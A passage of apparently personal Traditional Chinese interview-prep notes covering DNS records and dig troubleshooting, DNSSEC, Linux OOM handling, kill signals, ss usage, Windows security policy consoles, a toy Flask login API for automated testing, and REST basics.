example.com</span><br></pre></td></tr></table></figure></li><li>上方範例中只要輸入blog，系統就會自動改為blog.rsync.tw並送到168.95.1.1去做DNS解析，但如果不成功就會換成blog.hdns.com.tw再次嘗試，以此類推</li><li>若168.95.1.1的DNS服務無法連上，系統就會自動跳到第二筆的8.8.8.8伺服器</li></ul></li><li>要怎麼設定DNS Cache Server?<ul><li>去&#x2F;etc&#x2F;resolv.conf更改 nameserver</li></ul></li><li><strong>DNS權威Server以及DNS Cache Server差別?</strong><ul><li>DNS Authoritative Server:會從自己的資料庫取出DNS紀錄並回應請求</li><li>Cache Server則是去詢問其他主機的DNS資料</li></ul></li><li>DNS中甚麼是NS(Nameserver)紀錄?<br>  <img src="https://i.imgur.com/YMAcJ1x.png"><ul><li>root server會去記錄每個子網域的授權主機位置就是透過NS Record</li><li>NS Record的用途有兩個:一個是向下授權、一個是平行授權</li><li>向下授權: 建立一個子網域 (EX. 跟Server建立一個.tw的子網域)，並授權給TWNIC的主機</li><li>平行授權: 同個網域名稱的所有NameServer，都必須有相同的NS紀錄<br>  <img src="https://i.imgur.com/9mo0lwG.png"></li><li>上面就是 ntpu.edu.tw 已經授權給六台nameserver，這六台的ntpu.edu.tw的ns紀錄必須完全一樣</li></ul></li><li>要怎麼知道自己的DNS主機目前正式授權到哪些主機上面?<ul><li>購買網域名稱時後填寫的Nameserver，註冊商會依照所註冊的域名</li><li>把你的nameserver送給Registry，Registry確認後就會把你的主機資料放入他們的紀錄中</li><li>就會產生一組NS資料  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ dig [domain] ns</span><br></pre></td></tr></table></figure></li><li>透過上述指令確認目前NameServer資料是否跟註冊時填寫一致</li></ul></li><li>甚麼是SOA Record?<ul><li>SOA紀錄是<strong>網域名稱的系統管理紀錄</strong></li><li>若使用代管則不需要處理(CloudFlare, Gandi LiveDNS)</li><li>自架的DNS主機則會需要設定</li><li>主要代表者會是網域名稱的管理者、管理主機、區域檔序號與全域性的TTL資料</li></ul></li><li>甚麼是A&#x2F;AAAA紀錄<ul><li>當要將網域名稱對應到Server的IP位址時，就需要用到A紀錄</li><li>A紀錄指向到IPv4位址</li><li>AAAA紀錄指向到IPv6位址  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ dig +short blog.rsync.tw a</span><br><span class="line">$ dig +short blog.rsync.tw aaaa</span><br></pre></td></tr></table></figure></li></ul></li><li>甚麼是MX紀錄?<ul><li>這個網域的mail server紀錄</li><li>如果有人寄信給你，郵件主機會優先查詢這個網域名稱有沒有 MX 紀錄</li><li>如果有，就會連線到郵件主機，如果沒有特別設定 MX 紀錄</li><li>寄送郵件的主機會嘗試解析網域名稱的 A 紀錄</li><li>如果有 A 紀錄，就會嘗試連線主機的郵件伺服器。<br>  <img src="https://i.imgur.com/eQNw7LE.png"></li><li>當Domain Name有MX紀錄，mail主機會嘗試連線mg.ntust.edu.tw</li><li>MX紀錄中可以設定mail server優先順序，數值越小的優先</li><li>所以寄給ntust.edu.tw的信，會優先送給 mg.ntust.edu.tw</li><li>若沒有mx紀錄，則會送給Domain Name名稱的A紀錄，即140.118.31.99<br>  <img src="https://i.imgur.com/rO5idoQ.png"></li></ul></li><li>甚麼是CNAME紀錄?<ul><li><strong>主機名稱的別名的一種</strong>，當你的目的位址是主機名稱時，而不是IP位址</li><li>這時則須要使用CNAME進行對應</li><li>限制: 同一筆紀錄底下如果有設定CNAME紀錄，就不能設定其他紀錄<ul><li>為甚麼?</li></ul></li><li>EX. <strong>若設定某個domain的CNAME，則不可設定A、MX、TXT等紀錄</strong></li></ul></li><li>若有人設定某個Domain Name的CNAME，例如我註冊 HelloWorld.tw 然後想要把網頁瀏覽者連到跟blog.HelloWorld.tw一樣的網站，所以設定了  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HelloWorld.tw  CNAME  blog.HelloWorld.tw</span><br></pre></td></tr></table></figure><ul><li>但HelloWorld.tw一定帶有SOA與NS紀錄，會跟CNAME產生衝突，會造成網域名稱運作不穩定，所以若要完成一樣的功能可以透過網頁跳轉的方式來完成</li></ul></li><li>可以講解一下 <code>dig</code> 指令怎麼使用嗎?甚麼情況下你會用到這個指令?.<ul><li>是一種DNS除錯工具，能夠模擬一般電腦查詢、遞迴查詢、非遞迴查詢、DNS 快取伺服器查詢、DNSSEC 查詢、TCP 查詢等等。</li><li><code>dig</code> 的回應區段<br>  <img src="https://i.imgur.com/kHAra1e.png"><ul><li>Header<br>  <img src="https://i.imgur.com/nr5u3aS.png"><ul><li>ID: 純數字，DNS查詢的識別碼</li><li>QR:0查詢 1 回應</li><li>Opcode: 0 QUERY,1 IQUERY, 2 STATUS</li><li>AA: 權威伺服器回應</li><li>TC: 截斷</li><li>RD: 用戶端是否要求遞迴查詢</li><li>RA: 伺服器回應是支援遞迴查詢</li><li>Z: 保留</li><li>RCODE: 0沒有錯誤、1-5 錯誤代碼</li><li>QDCOUNT: Question區段的資料數量</li><li>ANCOUNT: Answer區段的資料數量</li><li>NSCOUNT: Authority區段的資料數量</li><li>ARCOUNT: Additional區段的資料數量</li></ul></li><li>Question</li><li>Answer</li><li>Authority</li><li>Additional</li></ul></li><li><code>dig</code>的參數<ul><li><code>@server</code> 指定伺服器，<strong>對哪台Server發出DNS查詢，若不指定則使用系統預設</strong></li><li><code>+short</code> 簡略輸出，只顯示ANSWER部分，若沒回應則顯示空白</li><li><code>-4</code> 只使用 IPv4位址進行與Server的連線</li><li><code>-6</code> 只使用 IPv6位址進行與Server的連線</li><li><code>+tcp</code> 使用TCP的方式與DNS Server連線<ul><li><strong>DNS原生是使用 UDP&#x2F;53 協定</strong>，若有人忘記開啟主機或IP分享器的防火牆</li><li>則會透過 <code>+tcp</code> 的方式將DNS查詢改為TCP連線</li><li>若一般查詢沒回應，而<code>+tcp</code>會過，則代表防火牆沒有開啟</li></ul></li><li><code>cdflag</code> 用於關閉DNSSEC查詢<ul><li>DNSSEC是一種DNS的延伸安全協定，可以確保DNS紀錄無法被偽造(透過電子簽章的方式)</li><li>若DNSSEC管理不當則會造成DNSSEC驗證失敗</li><li>會發生不穩定的DNS解析</li><li>此時可以透過此參數將其關閉</li><li>若一般查詢沒回應，但+cdflag後有正確回應，則代表DNSSEC壞掉</li></ul></li></ul></li><li>指令範例  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 查詢快取Server的A紀錄</span><br><span class="line">$ dig @8.8.8.8 blog.rsync.tw. a</span><br><span class="line"># 查詢Domain Name的MX</span><br><span class="line">$ dig rsync.tw mx</span><br><span class="line"># 查詢Domain Name負責人</span><br><span class="line">$ dig rsync.tw soa</span><br><span class="line"># 追蹤模式</span><br><span class="line">$ dig +trace blog.rsync.tw a</span><br><span class="line"># tcp查詢模式</span><br><span class="line">$ dig +tcp blog.rsync.tw a</span><br><span class="line"># 查詢IP反解  = nslookup &lt;IP&gt;</span><br><span class="line">$ dig -x 8.8.8.8 ptr</span><br><span class="line"># 關閉DNSSEC查詢</span><br><span class="line">$ dig +cdflag @8.8.8.8 blog.rsync.tw a</span><br></pre></td></tr></table></figure></li></ul></li><li>DNS Troubleshooting<ul><li>step 1 : 查詢NS位址<ul><li>在你作 dig 除錯開始之前，首先你要確認網域名稱的名稱伺服器(NameServer) 位址，因為所有回應都一定從名稱伺服器回應，所有使用Domain Name Registry或是Cloudfare之類的服務則NameServer會是這些業者，也有是註冊時填寫的NameServer欄位資料  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ dig +short rsync.tw ns</span><br></pre></td></tr></table></figure></li><li>可看出NameServer是哪幾台(DNS紀錄由哪幾台負責)</li><li>或是由淺入深從較高層的DNS Server查下來  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ dig +short tw ns</span><br></pre></td></tr></table></figure>  <img src="https://i.imgur.com/4t141yp.png">  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ dig +short @a.dns.tw edu.tw ns</span><br></pre></td></tr></table></figure>  <img src="https://i.imgur.com/EZmwnTT.png">  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ dig +short  @moestar.edu.tw [target domain name] ns</span><br></pre></td></tr></table></figure></li><li>為何不直接 dig +short ntust.edu.tw ?<br>  <img src="https://i.imgur.com/6miPWp1.png"><ul><li>因為這樣會透過系統Cache Server去查詢DNS NS紀錄</li></ul></li></ul></li><li>可能發生的情況:<ul><li>空的、沒回應<ul><li>如果你在查詢 NS 的時候出現錯誤，或是發現有回應，但是沒有資料</li><li>可能情況-1: NameServer填錯，請Domain Name Registry檢查</li><li>可能情況-2: 網遇到期沒繳錢，或狀況有問題(透過<code>Whois</code> 指令來查看)</li></ul></li><li>NameServer是Public DNS<ul><li>有人會把Public DNS以為是NameServer，就把8.8.8.8填入nameserver那邊，但這樣是不對的</li></ul></li><li>跟你填的資料不同<ul><li>Domain Name Registry沒有將你的名稱更新到域名管理局或是你剛好更換NameServer中</li></ul></li></ul></li><li>Step 2 : 直接查詢Name Server的資料<ul><li>確認NS位址後，接下來對Name Server送出查詢</li><li>查詢你要解析的域名，稱伺服器回應的資料應該是最新、最完整的，所以你要知道紀錄更新了沒、解析到底正不正確，都是透過直接查詢名稱伺服器來獲得解答。<br>  <img src="https://i.imgur.com/MHvHAb6.png"></li></ul></li><li>可能發生的問題-2:<ul><li>NameServer同步不一致<ul><li>確保每台NameServer回應資料都是正確的</li></ul></li><li>NameServer無回應<ul><li>代表NameServer的DNS服務有問題</li><li>可能DNS服務沒啟用或機器有問題</li><li>可以ping一下NameServer，如果有回應就是DNS服務的問題</li><li>則可透過 <code>dig +tcp</code>來檢查是不是防火牆的問題</li><li>若有回應則要朝向防火牆的問題去解決  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#查詢Name Server回應，可以查詢SOA，因為一定有這筆紀錄</span><br><span class="line">$ dig @(NS IP) (domain) soa</span><br><span class="line">#如果沒回應，ping看看是不是主機或網路問題</span><br><span class="line">$ ping (NS IP)</span><br><span class="line"># 如果ping有回應，則改用+tcp 來檢查是不是防火牆問題</span><br><span class="line">$ dig +tcp @(NS IP) (domain) soa</span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li>Step 3 : 檢查Authority Server回答<ul><li>nameserver通常是由上往下授權<ul><li>ex. rsync.tw nameserver是由.tw往下授權到 ns[1-3].gandi.net的nameserver的</li></ul></li><li>授權不一定正確(其實是使用者自己填的，可能會填錯)，上層依照使用者輸入的資料直接變成NameServer</li><li>正確授權:<ul><li><ol><li>由上對下正確授權</li></ol></li><li><ol start="2"><li>伺服器具備權威伺服器的回答  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ dig @ns1.gandi.net rsync</span><br><span class="line"></span><br><span class="line"># response</span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.10.3-P4-Ubuntu &lt;&lt;&gt;&gt; @ns1.gandi.net rsync.tw a</span><br><span class="line">; (2 servers found)</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 45858</span><br><span class="line">;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="line">;; WARNING: recursion requested but not available</span><br><span class="line">...omit...</span><br></pre></td></tr></table></figure></li></ol></li></ul></li><li>不使用 +short 參數，就可以看到Header部分，可以看Header中的<strong>AA Flag</strong> </li><li>回應中，有一個 “flags: qr aa rd;”，aa &#x3D; AA 就是權威伺服器回答的意思</li><li>代表這台Server知道自己管理了此網域，所以從區域檔中的資料回應給查詢端</li><li>對Public DNS查詢則不會有這個AA Flag</li><li>而若是對Name Server查詢而沒有AA，則代表管理員沒有正確設定Server</li></ul></li><li>Step 4 : 查詢Cache Server(Public DNS)<ul><li>最後一步就是要查詢快取伺服器的回應資料，看看是否正確，一般所有的用戶電腦都會透過快取伺服器 (譬如8.8.8.8、168.95.1.1) 取得 DNS 的資料，所以我們要測試一下是否正確：  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ dig @8.8.8.8 www.rsync.tw a</span><br></pre></td></tr></table></figure></li></ul></li><li>可能發生的問題-4<ul><li>查詢到舊資料<ul><li>DNS 有TTL暫存時間</li><li>暫存時間內，都會保留資料直到TTL(秒)時間過去</li><li>這時需要確認每個Authority Server的查詢是否都是最新資料</li></ul></li><li>解析失效NXDOMAIN<ul><li>若上述查詢過程中都沒問題，但Public DNS這些快取Server卻沒反應</li><li>可能是 DNSSEC壞掉了</li><li>此時需要找你的Domain Name的註冊商去取消你的DNSKEY金鑰</li></ul></li></ul></li></ul></li><li>[DNSSEC壞掉會發生甚麼事?該怎麼修復]<a href="https://haway.30cm.gg/dnssec-broken/">(https:&#x2F;&#x2F;</a>)?<ul><li>現象:<ul><li>可能就只有透過授權給你的domain的權威DNS Server能夠查詢到你的A紀錄</li><li>但你如果查詢Public DNS Server(ex. 8.8.8.8)中A的你的domain的A紀錄可能藉會報錯</li></ul></li><li>檢查: <ul><li>這時可以透過 加上 <code>+cdflag</code> 參數來讓DNS Cache Server關閉DNSSEC驗證</li><li><code>cdflag</code> 就是告訴8.8.8.8，這個DNS查詢不需要進行DNSSEC驗證</li></ul></li><li>可能原因:<ul><li>若使用了某個域名代管服務，並開啟了DNSSEC</li><li>但後續又將Nameserver變更，這將會導致DNSSEC Chain 驗證失敗</li><li>因為DNSKEY沒有被移轉(新的Name Server中沒有DNSKEY)，則會導致驗證失敗</li></ul></li><li>解決方式: <ul><li>或是使用域名註冊商提供的介面並關閉DNSSEC的功能</li><li>或是在新的NameServer上重新簽署DNSSEC，然後更新DNSKEY</li></ul></li></ul></li><li>在LINUX中如何開啟DNSSEC?<ul><li>可修改 &#x2F;etc&#x2F;systemd&#x2F;resolv.conf中的DNSSEC設定值</li></ul></li><li>在&#x2F;etc&#x2F;resolv.conf中設定的nameserver被重置怎麼辦?<ul><li>透過 symbolic link指向 &#x2F;etc&#x2F;systemd&#x2F;resolv.conf  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ cd /etc</span><br><span class="line">$ rm resolv.conf</span><br><span class="line">$ ln -s /run/systemd/resolve/resolv.conf resolv.conf</span><br></pre></td></tr></table></figure></li><li>直接修改 &#x2F;etc&#x2F;systemd&#x2F;resolv.conf 中的DNS位址</li></ul></li><li>你會去怎麼處理Linux中Process的OOM問題?</li><li>甚麼是<strong>OOM Killer</strong>?<ul><li>Linux中負責監控那些占用memory過大，尤其是瞬間很快消耗大量memory的process</li><li>為了防止memory耗盡而kernel會把該process kill掉</li><li>有時候SSH不到機器，但能 ping 通，說明不是網絡的故障，很多原因是 sshd process被 OOM killer 殺掉了</li><li>Kernel會通過特定的演算法給每個process計算一個分數來決定殺哪個process</li><li>每個process的 OOM 分數可以在「**&#x2F;proc&#x2F;PID&#x2F;oom_score**」中找到</li><li>重啟機器後查看系統日誌「**&#x2F;var&#x2F;log&#x2F;messages**」會發現「Out of Memory: Kill process 1865（sshd）」類似的錯誤訊息</li><li><code>echo -17 /proc/PID/oom_adj</code> 來解決這個問題<ul><li>可調範圍: 15~ -16</li><li>-17是禁用</li></ul></li><li>或是修改Kernel參數:  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w vm.panic_on_oom=1 (預設為0)</span><br><span class="line">sysctl -p</span><br></pre></td></tr></table></figure></li></ul></li><li><code>kill -9</code> 與 <code>kill -15</code> 差別在哪?送的signal是甚麼?  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ kill PID</span><br><span class="line"># 訊號: SIGKILL</span><br><span class="line">$ kill -9 PID //立即強制停止程式執行</span><br><span class="line"># 訊號: SIGTERM</span><br><span class="line">$ kill -15 PID //以正常程序通知程式停止執行，預設的訊號</span><br><span class="line">$ kill -l 列出所有可用訊號</span><br><span class="line"></span><br></pre></td></tr></table></figure>  <img src="https://i.imgur.com/1INBiak.png"></li><li>怎麼查詢kill指令中哪個訊號對應甚麼數字<ul><li><code>$ kill -l &lt;數字&gt;</code></li></ul></li><li>可以解釋一下 <code>ss</code>指令的使用時機嗎?<ul><li>可以輸出所有已經建立的 TCP 連線</li><li>ss 指令可以自己指定篩選器（filter），篩選出自己需要的 sockets 資訊:  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 列出從本機連線到 192.168.0.1 這台主機的所有連線：</span><br><span class="line">$ ss -o state established dst 192.168.0.1</span><br><span class="line"># 列出從本機連線到 192.168.0.1 主機 80 連接埠的所有連線</span><br><span class="line">$ ss -o state established dst 192.168.0.1:80</span><br><span class="line"># 列出來自於 192.168.0.2 這台主機的所有連線：</span><br><span class="line">$ ss -o state established src 192.168.0.2</span><br><span class="line"># 列出所有 ssh 的連線，包含從本機往外的 ssh 連線，以及從外面連線進來的 ssh 連線：</span><br><span class="line">$ ss -o state established &#x27;( dport = :ssh or sport = :ssh )&#x27;</span><br></pre></td></tr></table></figure></li></ul></li><li>在Linux中如何列出服務?<ul><li>去 &#x2F;etc&#x2F;init.d 查看</li><li>或 <code>systemctl list-units --type service -all</code></li><li><code>sudo systemctl | grep running</code></li><li><code>service --status-all</code></li></ul></li><li>如何查看已建立的sockets<ul><li><code>systemctl list-sockets</code></li><li><code>netstat</code></li><li><code>ss</code></li></ul></li></ul><h2 id="app-檢測"><a href="#app-檢測" class="headerlink" title="app 檢測"></a>app 檢測</h2><p><a href="https://www.mas.org.tw/spaw2/uploads/files/20190916/AppV3.1.pdf">https://www.mas.org.tw/spaw2/uploads/files/20190916/AppV3.1.pdf</a></p><h2 id="Windows-Admin"><a href="#Windows-Admin" class="headerlink" title="Windows Admin"></a>Windows Admin</h2><ul><li>安全性設定<ul><li>若要使用 Local 安全性原則主控台設定設定:<ul><li>win+R</li><li><code>secpol.msc</code></li><li>在主控台設定安全性命令下，執行下列其中一項操作：<ul><li>按一下 [帳戶政策 &gt; 以編輯 <strong>密碼政策</strong> 或 <strong>帳戶鎖定政策</strong></li><li>按一下 [本地原則 以編輯 <strong>稽核原則</strong>、<strong>使用者</strong> <strong>許可權指派</strong>或 <strong>安全性選項</strong></li></ul></li></ul></li><li>若要使用本機群組策略編輯器主控台設定安全性原則設定<ul><li>win +R</li><li><code>gpedit.msc</code></li><li>在主控台樹狀樹中，按一下 [電腦組Windows 設定 ，然後按一下[安全性設定。</li><li>執行下列其中一項：<ul><li>按一下 [帳戶政策 &gt; 以編輯 密碼政策 或 帳戶鎖定政策。</li><li>按一下 [本地原則 以編輯 稽核原則、使用者 許可權指派或 安全性選項。</li></ul></li></ul></li></ul></li></ul><h2 id="網頁測試"><a href="#網頁測試" class="headerlink" title="網頁測試"></a>網頁測試</h2><ul><li><p>有做過網頁單元測試嗎?<br>  主要架設小型的Flask Web Server<br>  然後有自己建立小型的測試用的服務<br>  <em>test_api.py</em></p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import flask</span><br><span class="line">import json</span><br><span class="line">from flask import request</span><br><span class="line"></span><br><span class="line">server = flask.Flask(__name__)</span><br><span class="line">@server.route(&#x27;/login&#x27;, methods=[&#x27;get&#x27;, &#x27;post&#x27;])</span><br><span class="line">def login():</span><br><span class="line">username = request.values.get(&#x27;name&#x27;)</span><br><span class="line">pwd = request.values.get(&#x27;pwd&#x27;)</span><br><span class="line">if username and pwd:</span><br><span class="line">if username == &#x27;xiaoming&#x27; and pwd == &#x27;111&#x27;:</span><br><span class="line">resu = &#123;&#x27;code&#x27;: 200, &#x27;message&#x27;: &#x27;Login Success&#x27;&#125;</span><br><span class="line">return json.dumps(resu, ensure_ascii=False) </span><br><span class="line">else:</span><br><span class="line">resu = &#123;&#x27;code&#x27;: -1, &#x27;message&#x27;: &#x27;Login Failed&#x27;&#125;</span><br><span class="line">return json.dumps(resu, ensure_ascii=False)</span><br><span class="line">else:</span><br><span class="line">resu = &#123;&#x27;code&#x27;: 10001, &#x27;message&#x27;: &#x27;Parameter cannot be empty&#x27;&#125;</span><br><span class="line">return json.dumps(resu, ensure_ascii=False)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">server.run(debug=True, port=8888, host=&#x27;127.0.0.1&#x27;)</span><br></pre></td></tr></table></figure><p>  <img src="https://i.imgur.com/3UFNrTT.png"><br>  <em>config.ini</em></p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">[HTTP]</span><br><span class="line">scheme = http</span><br><span class="line">baseurl = 127.0.0.1</span><br><span class="line">port = 8888</span><br><span class="line">timeout = 10.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[EMAIL]</span><br><span class="line">on_off = on;</span><br><span class="line">subject = Auto testing Report</span><br><span class="line">app = Outlook</span><br><span class="line">addressee = M10909302@gmail.com</span><br></pre></td></tr></table></figure><p>  <em>getpathInfo.py</em></p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">def get_Path():</span><br><span class="line">path = os.path.split(os.path.realpath(__file__))[0]</span><br><span class="line">return path</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">print(&#x27;测试路径是否OK,路径为：&#x27;, get_Path())</span><br></pre></td></tr></table></figure><p>  執行結果<br>  <img src="https://i.imgur.com/SOJEwRf.png"></p><p>  <em>readConfig.py</em></p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import configparser</span><br><span class="line">import getpathInfo </span><br><span class="line"></span><br><span class="line">path = getpathInfo.get_Path()</span><br><span class="line">config_path = os.path.join(path, &#x27;config.ini&#x27;)</span><br><span class="line">config = configparser.ConfigParser()</span><br><span class="line">config.read(config_path, encoding=&#x27;utf-8&#x27;)</span><br><span class="line"></span><br><span class="line">class ReadConfig():</span><br><span class="line"></span><br><span class="line">def get_http(self, name):</span><br><span class="line">value = config.get(&#x27;HTTP&#x27;, name)</span><br><span class="line">return value</span><br><span class="line">def get_email(self, name):</span><br><span class="line">value = config.get(&#x27;EMAIL&#x27;, name)</span><br><span class="line">return value</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">print(&#x27;The Baseurl Value in HTTP is：&#x27;, ReadConfig().get_http(&#x27;baseurl&#x27;))</span><br><span class="line">print(&#x27;The on_off value in EMAIL is: &#x27;, ReadConfig().get_email(&#x27;on_off&#x27;</span><br></pre></td></tr></table></figure><p>  <img src="https://i.imgur.com/KyVjXZL.png"></p><blockquote><p><a href="https://itpcb.com/a/1297735">https://itpcb.com/a/1297735</a></p></blockquote></li></ul><h2 id="RESTFUL-API"><a href="#RESTFUL-API" class="headerlink" title="RESTFUL API"></a>RESTFUL API</h2><ul><li>請問你對於RESTFul Web服務的理解是甚麼?<ul><li>RESTFul Web Service就是遵循REST風格的Web服務架構</li><li>REST(Representational State Transfer)並使用HTTP來實踐</li></ul></li><li>甚麼是REST Resource?<ul><li>每個在REST架構底下的內容都算是一種資源，這種資源有點像是OOP內的Object</li><li>資源可以是test檔、HTML頁面、圖片或是其他動態資源</li><li>REST Server提供對於這些資源的存取，並使Client可以使用這些資源</li><li>每項資源都透過URI來做標誌</li></ul></li><li>甚麼是URI?<ul><li>Uniform Resource Identidier用於在REST架構中標誌資源</li><li><code>&lt;protocol&gt;://&lt;service-name&gt;/&lt;ResourceType&gt;/&lt;ResourceID&gt;</code></li><li>兩種種類的URI: <code>URN</code>、<code>URL</code></li><li><strong>URN</strong>: Uniform Resource Name<ul><li>透過一個獨特且持久的名稱來標示資源</li></ul></li><li><strong>URL</strong>: Uniform Resource Locator<ul><li>具有有關資源位置的相關資訊</li></ul></li></ul></li><li>你對JAX-RS的理解是甚麼?<ul><li>JAX-RS&#x3D; Java API for RESRful Web Service</li></ul></li><li>可以講一些你知道常見的HTTP Status Code嗎?<ul><li>1xx - 代表資訊回覆 (這啥?</li><li>2xx - 代表成功回應</li><li>3xx - 代表重新導向</li><li>4xx - 代表client出錯</li><li>5xx - 代表server出錯</li><li>200 ok</li><li>201- CREATED 用在PUT或POST</li><li>304-NOT MODIFIED - 用於有條件的GET請求，以減少網路頻寬使用，這個response的body要是空的</li><li>400-BAD REQUEST -驗證錯誤或缺少資料</li><li>401-UNAUTHORIZED - 請求中沒有包含有效身分認證資訊</li><li>403-FORBIDDEN - 無權或禁止存取資源</li><li>404-NOT FOUND - 資源方法不可用</li><li>500-INTERNAL SERVER ERROR- 當Server在運行時跳出一些異常</li><li>502-BAD GATEWAY - Server無法從其他Server中獲得response</li></ul></li><li>可以講一些你知道常見的HTTP Methods嗎?<br>  <img src="https://i.imgur.com/PBaFMYj.png"><ul><li>GET: 從Server中擷取資訊，一種唯讀的操作</li><li>POST: 用來在server中建立資源</li><li>PUT: 用來在server中更新現有資源或取代資源</li><li>DELETE: 用來在server中刪除資源</li><li>OPTIONS: 可獲取server上現有資源的支援選項清單</li><li>HEAD: 與Get相同，但只傳送狀態行以及Header部分</li></ul></li><li>SOAP以及REST之間的差異是甚麼?</li></ul><table><thead><tr><th>SOAP</th><th>REST</th></tr></thead><tbody><tr><td>Simple Object Access Protocol</td><td>Representatioanl State Transfer</td></tr><tr><td>用來實踐web服務的協定</td><td>是一種web的架構設計風格</td></tr><tr><td>SOAP無法使用REST</td><td>REST可使用SOAP作為實踐的一部分</td></tr><tr><td>有嚴格標準</td><td>不須嚴格遵守</td></tr><tr><td>client server更加耦合</td><td>REST Client靈活，不依賴Server開發方式</td></tr><tr><td>僅支援XML</td><td>支援XML,JSON,MIME,Text等</td></tr><tr><td>SOAP使用服務介面來公開資源</td><td>使用URI來開放資源</td></tr><tr><td>作為一種協定，它定義了自己的安全措施</td><td>僅根據它用於實現的協議繼承安全措施</td></tr></tbody></table><ul><li>開發RESTful web 服務的Best Practice會是甚麼?<ul><li>開發REST API並盡可能使用JSON資料格式並進行資料的接收與回覆，因為大多數client與server之間都內置了輕鬆讀取與解析JSON物件的方式<ul><li>應用程式以JSON格式作為Response應要將Content-Type設為application&#x2F;json</li><li>某些HTTP Client端會去察看Response Header的值來去做解析</li><li>resquest header中的Content-Type:要設成application&#x2F;json</li></ul></li><li><strong>在命名資源endpoint的時候應該使用複數名詞，而不是動詞，API Endpoint應要簡短、易於理解</strong><ul><li>不用動詞是因為HTTP Method中已經描述了請求行為為何了</li><li>常用的HTTP 